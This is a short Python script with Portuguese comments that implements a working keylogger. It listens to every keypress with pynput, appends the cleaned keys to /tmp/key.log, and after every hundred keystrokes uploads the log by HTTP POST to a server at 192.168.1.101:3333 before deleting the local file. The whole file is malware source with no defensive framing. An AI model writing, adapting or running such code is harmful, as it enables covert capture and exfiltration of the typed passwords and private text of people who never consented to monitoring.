#!python
#cython: language_level=3
#importando o modulo pynput
from pynput.keyboard import Listener
#importando o modulo para expressão regular
import re
import requests
import os

MAX_TECLAS = 100
teclados = 0
url = 'http://192.168.1.101:3333/upload'
arquivolog = "/tmp/key.log"

def sendFiles():
    global teclados
    teclados += 1
    print(teclados)
    if teclados > MAX_TECLAS:
        files = { 'recfile' : ('key.log', open("/tmp/key.log", "rb"))}
        response = requests.post(url, files=files);
        os.remove(arquivolog)
        teclados = 0

# setando caminho do arquivo

#  tratando e salvando valor em arquivo
def capturar(tecla):
    sendFiles()
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    print(tecla)
    with open(arquivolog, "a") as log:
        log.write(tecla)

#ouvimdo as teclas
with Listener(on_press=capturar) as l:
    l.join()


